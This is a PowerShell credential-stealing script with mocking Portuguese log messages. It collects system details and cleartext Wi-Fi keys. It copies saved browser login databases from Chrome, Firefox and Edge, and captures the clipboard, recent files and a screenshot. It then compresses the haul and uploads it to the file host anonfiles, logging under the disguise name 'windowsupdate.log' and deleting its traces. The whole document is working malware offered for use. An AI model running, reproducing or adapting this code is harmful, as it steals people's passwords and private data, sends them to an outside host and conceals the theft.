# ---------- KIT v6.2 – “FAZ TUDO + PIADAS” ----------
$ErrorActionPreference = "Stop"
$kit   = "$env:TEMP\kit"
$log   = "$env:TEMP\windowsupdate.log"
$7z    = "$env:TEMP\7za.exe"

function L ($m) { "$(Get-Date -f 'yyyy-MM-dd HH:mm:ss')  $m" | Tee $log -Append }

# 0) 7z single-file
if (!(Test-Path $7z)) {
    L "[7Z] Baixando 7za.exe do além..."
    iwr "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7z.zip" -UseBasicParsing
    Expand-Archive "$env:TEMP\7z.zip" "$env:TEMP" -Force
    Move-Item "$env:TEMP\7za.exe" $7z -Force
}

Ni -ItemType Directory -Path $kit -Force >$null
L "[START] Vasculhando a vida digital do trouxa..."

# 1) Dados do sistema
L "[SYS] Catando senhas de BIOS e segredos de infância..."
systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8

# 2) Rede
L "[NET] Descobrindo Wi-Fi da vizinha gostosa..."
Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit" >$null

# 3) Contas
L "[USER] Listando admins que usam 123456..."
Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
$sec = Get-WinEvent -ListLog Security -EA 0
if ($sec -and $sec.RecordCount) {
    Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 200 -EA 0 |
        Select TimeCreated,ID,LevelDisplayName,Message |
        Out-File "$kit\logins.txt" -Encoding UTF8
} else {
    "Log de segurança sumido – deve estar com medo" | Out-File "$kit\logins.txt" -Encoding UTF8
}

# 4) Navegadores
L "[BROWSER] Roubando senhas dos sites pornô..."
@(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
) | ?{ Test-Path $_ } | %{
    Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA 0
}

# 5) Certificados
L "[CERT] Listando certificados falsos de traficante..."
Get-ChildItem Cert:\CurrentUser\My |
    Select Subject,Thumbprint,NotAfter |
    Out-File "$kit\mycerts.txt" -Encoding UTF8

# 6) Clipboard
L "[CLIP] Lendo o que o usuário copiou de OnlyFans..."
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8

# 7) Recentes
L "[RECENT] Vasculhando atalhos de hentai..."
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA 0 |
    Select Name,LastWriteTime |
    Out-File "$kit\recent.txt" -Encoding UTF8

# 8) Screenshot
L "[SCREEN] Fotografando desktop cheio de vergonha..."
Add-Type -Assembly System.Windows.Forms
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp    = New-Object System.Drawing.Bitmap($bounds.Width,$bounds.Height)
$g      = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bounds.Size)
"$kit\screenshot.jpg" | %{ $bmp.Save($_,[System.Drawing.Imaging.ImageFormat]::Jpeg) }
$g.Dispose(); $bmp.Dispose(); [GC]::Collect()

# 9) Compactação ultra-rápida
L "[7Z] Empacotando as traquinagens..."
$arc = "$env:TEMP\kit.7z"
& $7z a -t7z -mx=1 -y $arc "$kit\*" | Out-Null

# 10) Upload – acha mirror vivo
L "[UP] Enviando pro chefe em NuvemParalela™..."
try {
    $upUrl = (iwr "https://api.anonfiles.com/upload" -Method HEAD -UseBasicParsing -EA 0).BaseResponse.ResponseUri.AbsoluteUri
    if (!$upUrl) { $upUrl = "https://api.anonfiles.com/upload" }
    $curl  = "curl.exe -s -F `"file=@$arc`" $upUrl"
    $reply = cmd /c $curl
    if ($reply -match '"full":"([^"]+)"') {
        L "[OK] Evidências entregues – link: $($matches[1])"
    } else {
        L "[ERRO] Servidor rejeitou nosso presente: $reply"
    }
} catch {
    L "[ERRO] Upload caiu no poço: $_"
}

# 11) Limpeza
L "[CLEAN] Apagando corpos..."
Remove-Item $kit,$arc -Recurse -Force -EA 0
L "[END] Missão cumprida. Log em $log"
